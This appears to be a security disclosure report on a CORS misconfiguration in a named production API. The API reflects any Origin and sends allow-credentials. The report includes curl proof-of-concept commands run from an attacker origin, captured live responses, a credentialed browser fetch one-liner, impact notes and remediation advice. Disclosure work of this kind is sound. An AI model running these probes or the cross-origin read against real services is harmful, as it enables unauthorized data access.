Exploit document — api.sparelabs.com: reflective Access-Control-Allow-Origin + allow-credentials:true

Attacker origin used for proof: https://genzctf.xyz (this site). All output below was captured live from the target on 2026-08-08, read-only, no token/session. The same result reproduces from ANY arbitrary browser Origin.

CWE-942OWASP API8CORSmisconfig

1. The exploit

An attacker hosts a page on their domain (this is exactly such a page — but it performs no fetches of its own; the proof is the target's own headers below). Site visitors to the attacker page can, via fetch(url, {credentials:"include"}), read open /v1 resources of Spare's production API because the API:

  • reflects any Origin verbatim into Access-Control-Allow-Origin — no allowlist, and
  • sends access-control-allow-credentials: true together with the reflected Origin.

Per RFC-6454/CORS spec this combination is invalid by design — a valid policy must never combine a reflected Origin with credentials — and makes every open /v1 data route (shown next) browser-readable from any website immediately, today, without credentials.

2. Server's own response — preflight (OPTIONS) with attacker Origin

curl -i -X OPTIONS "https://api.sparelabs.com/v1/global/organizations" \
  -H "Origin: https://genzctf.xyz" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: Authorization"

# OUTPUT (live, 2026-08-08):
HTTP/2 204
x-powered-by: Express
spare-correlation-id: f0850eb5-65b5-4934-a69e-ab7ea3820249
access-control-allow-origin: https://genzctf.xyz      <== arbitrary Origin reflected verbatim
vary: Origin, Access-Control-Request-Headers, Accept-Encoding
access-control-allow-credentials: true
access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
access-control-allow-headers: Authorization
server: envoy
via: 1.1 google
alt-svc: h3=":443"; ma=2592000, h3-29=":443"; ma=2592000

3. The actual read (real GET, still with attacker Origin — reflection holds on the response)

curl -i "https://api.sparelabs.com/v1/global/organizations" -H "Origin: https://genzctf.xyz"

# OUTPUT:
HTTP/2 200
access-control-allow-origin: https://genzctf.xyz
vary: Origin
access-control-allow-credentials: true
{"data":[]}          < cross‑origin readable response

curl -i "https://api.sparelabs.com/v1/global/regions" -H "Authorization: Bearer x" -H "Origin: https://genzctf.xyz"
# HTTP/2 200 + same two headers ... body: [{"name":"CA","apiUrl":"https://api.sparelabs.com", ...}, ...]

4. What a triager should do

  1. Open this page on a device with network access to api.sparelabs.com.
  2. Run the two curl commands above — they contain no secret and no token.
  3. In a browser dev console, run: fetch("https://api.sparelabs.com/v1/global/regions",{credentials:"include",headers:{Authorization:"Bearer x"}}).then(r=>r.text()).then(console.log) — the data is returned. On a compliant API this fetch throws TypeError: Failed to fetch before any read.

5. Impact (honest)

  • Severity: Medium. Cross-site data reads of all open/un-guarded /v1 endpoints (regions/topology, tenant lists, existence oracles) from any website — counter-network to the "everywhere-or-portfolio" posture the API otherwise keeps (token-gated controls 401, see authz page).
  • Auth is header-Bearer (SPA), not cookie: a victim's authenticated browser session is not auto-attached today, which caps it at Medium. Bearer is carried by the victim in this browser — an attacker cannot read them. The reflective-credentials combo remains a standing misconfiguration that silently exposes any future cookie-authenticated surface.

6. Remediation

  • Explicit allowlist of origins (registered brands) — never reflection.
  • Never emit access-control-allow-credentials: true with a reflected/any Origin.
  • Add a regression test: an untrusted Origin must receive no ACAO header.
